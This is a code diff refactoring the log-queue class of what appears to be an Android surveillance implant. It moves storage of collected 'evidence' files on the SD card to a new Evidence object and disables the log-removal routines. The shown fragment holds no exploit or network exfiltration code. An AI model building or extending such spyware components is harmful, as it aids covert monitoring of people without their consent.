@@ -24,6 +24,7 @@ import android.os.Environment;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.file.Path;
+import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -39,7 +40,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	private final BlockingQueue<Packet> q;
 	
 	/** The log map. */
-	private final HashMap<Long, File> logMap;
+	private final HashMap<Long, Evidence> evidences;
 
 	/** The halt. */
 	private boolean halt;
@@ -52,6 +53,9 @@ public class LogDispatcher extends Thread implements Runnable {
 	
 	/** The no logs. */
 	final Condition noLogs = lock.newCondition();
+
+	private String TAG = "LogDispatcher";
+	
 
 	/*
 	 * private BroadcastReceiver mExternalStorageReceiver; private boolean
@@ -66,7 +70,7 @@ public class LogDispatcher extends Thread implements Runnable {
 		halt = false;
 
 		q = new LinkedBlockingQueue<Packet>();
-		logMap = new HashMap<Long, File>();
+		evidences = new HashMap<Long, Evidence>();
 	}
 
 	// Log name: QZM + 1 byte + 8 bytes + 4 bytes
@@ -102,13 +106,15 @@ public class LogDispatcher extends Thread implements Runnable {
 			Log.d("RCS", "processQueue() got LOG_CREATE");
 			createLog(p);
 			break;
-
-		case LogR.LOG_ADDITIONAL:
-			Log.d("RCS", "processQueue() got LOG_ADDITIONAL");
+			
+		case LogR.LOG_ATOMIC:
+			Log.d("RCS", "processQueue() got LOG_ATOMIC");
+			atomicLog(p);
 			break;
 
 		case LogR.LOG_APPEND:
-			Log.d("RCS", "processQueue() got LOG_APPEND");
+			Log.e("RCS", "processQueue() got LOG_APPEND: DEPRECATED, use write");
+			writeLog(p);
 			break;
 
 		case LogR.LOG_WRITE:
@@ -122,13 +128,13 @@ public class LogDispatcher extends Thread implements Runnable {
 			break;
 
 		case LogR.LOG_REMOVE:
-			Log.d("RCS", "processQueue() got LOG_REMOVE");
-			removeLog(p);
+			Log.e("RCS", "processQueue() got LOG_REMOVE: DEPRECATED");
+			//removeLog(p);
 			break;
 
 		case LogR.LOG_REMOVEALL:
-			Log.d("RCS", "processQueue() got LOG_REMOVEALL");
-			removeAll();
+			Log.e("RCS", "processQueue() got LOG_REMOVEALL: DEPRECATED");
+			//removeAll();
 			break;
 
 		case LogR.LOG_WRITEMRK:
@@ -137,7 +143,7 @@ public class LogDispatcher extends Thread implements Runnable {
 			break;
 
 		default:
-			Log.d("RCS", "processQueue() got LOG_UNKNOWN");
+			Log.e("RCS", "processQueue() got LOG_UNKNOWN");
 			break;
 		}
 
@@ -185,7 +191,7 @@ public class LogDispatcher extends Thread implements Runnable {
 				// Halt command has precedence over queue processing
 				if (halt == true) {
 					q.clear();
-					logMap.clear();
+					evidences.clear();
 					Log.d("RCS", "LogDispatcher closing");
 					return;
 				}
@@ -205,12 +211,12 @@ public class LogDispatcher extends Thread implements Runnable {
 	 * @param o the o
 	 * @return true, if successful
 	 */
-	public synchronized boolean send(final Packet o) {
+	public synchronized boolean send(final Packet packet) {
 		lock.lock();
 		boolean added = false;
 
 		try {
-			added = q.add(o);
+			added = q.add(packet);
 
 			if (added) {
 				noLogs.signal();
@@ -239,39 +245,6 @@ public class LogDispatcher extends Thread implements Runnable {
 	}
 
 	/**
-	 * Creates the log.
-	 *
-	 * @param p the p
-	 * @return true, if successful
-	 */
-	private boolean createLog(final Packet p) {
-		try {
-			// Create the file
-			File file;
-
-			do {
-				file = null;
-				final String logName = "QZA-" + (byte) p.getPriority() + "-"
-						+ Utils.getTimeStamp() + ".tmp";
-				file = new File(sdDir, logName);
-			} while (file.createNewFile() == false);
-
-			if (logMap.containsKey(p.getId()) == true) {
-				Log.d("RCS", "Duplicate log entry");
-				return false;
-			}
-
-			logMap.put(p.getId(), file);
-		} catch (final Exception e) {
-			Log.d("RCS", "LogDispatcher.createLog() exception detected");
-			e.printStackTrace();
-			return false;
-		}
-
-		return true;
-	}
-
-	/**
 	 * Write markup.
 	 *
 	 * @param p the p
@@ -281,17 +254,17 @@ public class LogDispatcher extends Thread implements Runnable {
 		try {
 			File file = null;
 			final String markupName = "QZM-" + p.getType() + ".mrk";
-
+	
 			file = new File(sdDir, markupName);
-
+	
 			final boolean created = file.createNewFile();
-
+	
 			if (created == false) {
 				return false;
 			}
-
+	
 			// TODO: Scrivi nel file
-
+	
 			return true;
 		} catch (final Exception e) {
 			Log.d("RCS", "LogDispatcher.createLog() exception detected");
@@ -301,51 +274,55 @@ public class LogDispatcher extends Thread implements Runnable {
 	}
 
 	/**
+	 * Creates the log.
+	 *
+	 * @param p the p
+	 * @return true, if successful
+	 */
+	private boolean createLog(final Packet p) {	
+		Check.ensures(!evidences.containsKey(p.getId()),"evidence already mapped");
+
+		byte[] additional = p.getAdditional();
+		Evidence evidence = new Evidence(p.getType());
+		evidence.createEvidence(additional);
+		evidences.put(p.getId(),evidence);
+		
+		return true;
+	}
+
+	/**
+	 * Creates a simple log, copies the payload and closes it in one atomic step.
+	 * @param p
+	 */
+	private void atomicLog(Packet p) {
+		Check.ensures(!evidences.containsKey(p.getId()),"evidence already mapped");
+		
+		byte[] additional = p.getAdditional();
+		byte[] data = p.peek();
+		Evidence evidence = new Evidence(p.getType());
+		evidence.createEvidence(additional);
+		evidence.writeEvidence(data);
+		evidence.close();
+	}
+
+	/**
 	 * Write log.
 	 *
 	 * @param p the p
 	 * @return true, if successful
 	 */
 	private boolean writeLog(final Packet p) {
-		OutputStream out = null;
-
-		try {
-			// Create the file
-			File file;
-
-			do {
-				file = null;
-				final String logName = "QZA-" + (byte) p.getPriority() + "-"
-						+ Utils.getTimeStamp() + ".tmp";
-				file = new File(sdDir, logName);
-			} while (file.createNewFile() == false);
-
-			if (logMap.containsKey(p.getId()) == true) {
-				Log.d("RCS", "Duplicate log entry");
-				return false;
-			}
-
-			logMap.put(p.getId(), file);
-
-			out = new BufferedOutputStream(new FileOutputStream(file));
-			out.write('Q');
-			out.flush();
-			out.close();
-		} catch (final Exception e) {
-			e.printStackTrace();
-		} finally {
-			if (out != null) {
-				try {
-					out.close();
-				} catch (final IOException e) {
-					e.printStackTrace();
-					return false;
-				}
-			}
+		if (evidences.containsKey(p.getId()) == false) {
+			Log.d(TAG , "Requested log not found");
+			return false;
 		}
-
-		return true;
+		
+		Evidence evidence = evidences.get(p.getId());
+		boolean ret = evidence.writeEvidence(p.peek());
+		return ret;
+		
 	}
+
 
 	/**
 	 * Close log.
@@ -354,59 +331,18 @@ public class LogDispatcher extends Thread implements Runnable {
 	 * @return true, if successful
 	 */
 	private boolean closeLog(final Packet p) {
-		if (logMap.containsKey(p.getId()) == false) {
-			Log.d("RCS", "Requested log not found");
+		if (evidences.containsKey(p.getId()) == false) {
+			Log.d(TAG , "Requested log not found");
 			return false;
 		}
 
 		// Rename .tmp to .log
-		final File file = logMap.get(p.getId());
+		Evidence evidence = evidences.get(p.getId());
+		evidence.close();
 
-		String name = file.getName();
-
-		name = name.replaceFirst(".tmp", ".log");
-
-		final File to = new File(file.getParent(), name);
-		final boolean rename = file.renameTo(to);
-
-		logMap.remove(p.getId());
-		return rename;
+		return true;
 	}
 
-	/**
-	 * Removes the log.
-	 *
-	 * @param p the p
-	 * @return true, if successful
-	 */
-	private boolean removeLog(final Packet p) {
-		if (logMap.containsKey(p.getId()) == false) {
-			Log.d("RCS", "LogDispatcher.removeLog() Requested log not found");
-			return false;
-		}
-
-		// Rename .tmp to .log
-		final File file = logMap.get(p.getId());
-
-		final boolean remove = file.delete();
-
-		logMap.remove(p.getId());
-		return remove;
-	}
-
-	/**
-	 * Removes the all.
-	 */
-	private void removeAll() {
-		final File sdRemove = new File(Environment
-				.getExternalStorageDirectory(), "rcs");
-		final File file[] = sdRemove.listFiles(new ExtensionFilter(".log"));
-
-		for (final File f : file) {
-			Log.d("RCS", "Log list: " + f.getName());
-			f.delete();
-		}
-	}
 
 	/*
 	 * Inserire un Intent-receiver per gestire la rimozione della SD private
